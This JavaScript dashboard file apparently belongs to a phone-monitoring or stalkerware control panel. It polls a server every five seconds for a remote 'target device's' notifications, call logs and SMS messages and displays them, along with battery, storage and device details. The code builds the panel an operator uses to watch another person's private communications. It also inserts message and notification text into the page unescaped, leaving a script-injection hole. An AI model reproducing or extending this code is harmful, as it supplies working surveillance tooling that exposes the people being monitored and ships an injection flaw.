// DASHBOARD CORE DATA POPULATOR
class DashboardEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.init();
    }

    async init() {
        if (!this.activeDeviceId) return;
        await this.loadDeviceMetrics();
        await this.loadActivePermissions();
        
        // Teeno live polling engines ek sath start
        this.startDashboardNotificationPolling(); 
        this.startDashboardCallsPolling(); 
        this.startDashboardSMSPolling();
    }

    async loadDeviceMetrics() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                const dev = result.data.find(d => d.id === this.activeDeviceId);
                if (dev) {
                    this.populateMetadata(dev);
                }
            }
        } catch (e) {
            console.error(e);
        }
    }

    populateMetadata(dev) {
        const badge = document.getElementById('online-badge');
        if (badge) badge.className = dev.online_status ? 'status-dot online' : 'status-dot';

        const metrics = {
            'metric-battery': `${dev.battery_level}%`,
            'metric-charging': dev.is_charging ? 'Charging' : 'Discharging',
            'metric-temp': `${dev.temperature}°C`,
            'metric-net': dev.network_type,
            'metric-storage': dev.storage_used,
            'info-name': dev.name,
            'info-model': dev.model,
            'info-os': `Android ${dev.android_version}`,
            'info-version': `v${dev.app_version}`,
            'info-id': dev.device_id,
            'info-connected': new Date(dev.created_at).toLocaleDateString()
        };

        for (const [id, value] of Object.entries(metrics)) {
            const el = document.getElementById(id);
            if (el) {
                if (id === 'info-name') {
                    el.innerHTML = `
                        <span style="margin-right: 15px;">${value}</span>
                        <button onclick="deleteDevice('${dev.id}')" style="background: #ff3b30; color: white; border: none; border-radius: 5px; padding: 5px 12px; cursor: pointer; font-size: 0.85rem; font-weight: bold; transition: all 0.3s ease;">
                            Remove Device
                        </button>
                    `;
                } else {
                    el.textContent = value;
                }
            }
        }
    }

    async loadActivePermissions() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch(`/api/permissions?device_id=${this.activeDeviceId}`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                this.evaluateSystemPermissionOverlays(result.data);
            }
        } catch (e) {
            console.error(e);
        }
    }

    evaluateSystemPermissionOverlays(permsData) {
        const perms = Array.isArray(permsData) ? permsData[0] : permsData;
        if (!perms) return; 

        const config = {
            'calls-wrapper': perms.call_log,
            'sms-wrapper': perms.sms,
            'files-wrapper': perms.storage,
            'notifications-wrapper': perms.notification_access 
        };

        for (const [wrapperId, isGranted] of Object.entries(config)) {
            const target = document.getElementById(wrapperId);
            if (target) {
                if (!isGranted) {
                    this.applySectionProtectionOverlay(target);
                } else {
                    target.classList.remove('locked-section');
                    const lock = target.querySelector('.lock-overlay');
                    if (lock) lock.remove();
                }
            }
        }
    }

    applySectionProtectionOverlay(element) {
        if (element.querySelector('.lock-overlay')) return;

        element.classList.add('locked-section');
        const overlay = document.createElement('div');
        overlay.className = 'lock-overlay';
        overlay.innerHTML = `
            <i class="lucide-lock-keyhole"></i>
            <h4 style="color: #ff3b30; font-weight: 600;">Permission Not Granted</h4>
            <p style="color: #94a3b8; font-size: 0.9rem; max-width: 250px; margin: 0 auto;">
                Enable permission profiles from the target device.
            </p>
        `;
        element.appendChild(overlay);
    }

    // --- NOTIFICATION ENGINE ---
    startDashboardNotificationPolling() {
        this.fetchDashboardNotifications();
        setInterval(() => this.fetchDashboardNotifications(), 5000); 
    }

    async fetchDashboardNotifications() {
        if (!this.activeDeviceId) return;
        const targetWrapper = document.getElementById('notifications-wrapper');
        if (targetWrapper && targetWrapper.classList.contains('locked-section')) return;

        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch(`/api/notifications?device_id=${this.activeDeviceId}&limit=5`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                this.renderDashboardNotifications(result.data);
            }
        } catch (e) {
            console.error("Dashboard Notif Sync Error:", e);
        }
    }

    renderDashboardNotifications(items) {
        const container = document.getElementById('dashboard-notif-feed');
        if (!container) return;

        if (items.length === 0) {
            container.innerHTML = '<div style="color: var(--text-muted); font-size: 0.9rem;">No recent notifications received.</div>';
            return;
        }

        container.innerHTML = items.map(n => `
            <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; border-left: 3px solid var(--accent-cyan);">
                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                    <strong style="color: var(--accent-cyan); font-size: 0.85rem;">${n.app_name}</strong>
                    <span style="color: var(--text-muted); font-size: 0.75rem;">${new Date(n.received_at).toLocaleTimeString()}</span>
                </div>
                <div style="font-size: 0.9rem; font-weight: 600;">${n.title}</div>
                <div style="font-size: 0.85rem; color: #ccc; margin-top: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${n.message}</div>
            </div>
        `).join('');
    }

    // --- CALL LOGS ENGINE ---
    startDashboardCallsPolling() {
        this.fetchDashboardCalls();
        setInterval(() => this.fetchDashboardCalls(), 5000); 
    }

    async fetchDashboardCalls() {
        if (!this.activeDeviceId) return;
        const targetWrapper = document.getElementById('calls-wrapper');
        if (targetWrapper && targetWrapper.classList.contains('locked-section')) return;

        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch(`/api/calls?device_id=${this.activeDeviceId}&limit=5`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                this.renderDashboardCalls(result.data);
            }
        } catch (e) {
            console.error("Dashboard Calls Sync Error:", e);
        }
    }

    renderDashboardCalls(items) {
        const container = document.getElementById('dashboard-calls-feed');
        if (!container) return;

        if (items.length === 0) {
            container.innerHTML = '<div style="color: var(--text-muted); font-size: 0.9rem;">No call history archived yet.</div>';
            return;
        }

        container.innerHTML = items.map(c => {
            let typeColor = "#30d158"; 
            let typeIcon = "↙ Incoming";
            if (c.type.toLowerCase() === "missed") {
                typeColor = "#ff3b30";
                typeIcon = "✖ Missed";
            } else if (c.type.toLowerCase() === "outgoing") {
                typeColor = "var(--accent-cyan)"; 
                typeIcon = "↗ Outgoing";
            }

            return `
            <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; border-left: 3px solid ${typeColor};">
                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                    <strong style="color: white; font-size: 0.95rem;">${c.phone_number}</strong>
                    <span style="color: var(--text-muted); font-size: 0.75rem;">${new Date(c.timestamp).toLocaleTimeString()}</span>
                </div>
                <div style="display: flex; justify-content: space-between; font-size: 0.85rem; margin-top: 3px;">
                    <span style="color: ${typeColor}; font-weight: 600;">${typeIcon}</span>
                    <span style="color: #ccc;">${c.duration} Secs</span>
                </div>
            </div>
            `;
        }).join('');
    }

    // --- FINAL ADDITION: SMS ENGINE ---
    startDashboardSMSPolling() {
        this.fetchDashboardSMS();
        setInterval(() => this.fetchDashboardSMS(), 5000); 
    }

    async fetchDashboardSMS() {
        if (!this.activeDeviceId) return;
        const targetWrapper = document.getElementById('sms-wrapper');
        // Do not fetch if locked by permissions
        if (targetWrapper && targetWrapper.classList.contains('locked-section')) return;

        const token = localStorage.getItem('owner_token');
        try {
            // Fetching latest 5 messages
            const res = await fetch(`/api/messages?device_id=${this.activeDeviceId}&limit=5`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                this.renderDashboardSMS(result.data);
            }
        } catch (e) {
            console.error("Dashboard SMS Sync Error:", e);
        }
    }

    renderDashboardSMS(items) {
        const container = document.getElementById('dashboard-sms-feed');
        if (!container) return;

        if (items.length === 0) {
            container.innerHTML = '<div style="color: var(--text-muted); font-size: 0.9rem;">No SMS messages archived yet.</div>';
            return;
        }

        container.innerHTML = items.map(m => `
            <div style="background: rgba(255,255,255,0.05); padding: 12px; border-radius: 8px; border-left: 3px solid #f5a623;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                    <strong style="color: #f5a623; font-size: 0.9rem;">${m.sender}</strong>
                    <span style="color: var(--text-muted); font-size: 0.75rem;">${new Date(m.timestamp).toLocaleTimeString()}</span>
                </div>
                <div style="font-size: 0.85rem; color: #ccc; margin-top: 3px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;">${m.message_preview}</div>
            </div>
        `).join('');
    }
}

window.deleteDevice = async function(deviceId) {
    if (!confirm("WARNING: Are you sure you want to permanently remove this device and all its data? This action cannot be undone.")) return;

    const token = localStorage.getItem('owner_token');
    try {
        const res = await fetch(`/api/devices/${deviceId}`, {
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const result = await res.json();
        if (result.status === 'success') {
            alert("Device removed successfully.");
            localStorage.removeItem('active_device_id'); 
            window.location.reload(); 
        } else {
            alert("Failed to remove device: " + result.message);
        }
    } catch (e) {
        console.error("Delete Action Failed:", e);
    }
};

document.addEventListener('DOMContentLoaded', () => {
    new DashboardEngine();
});
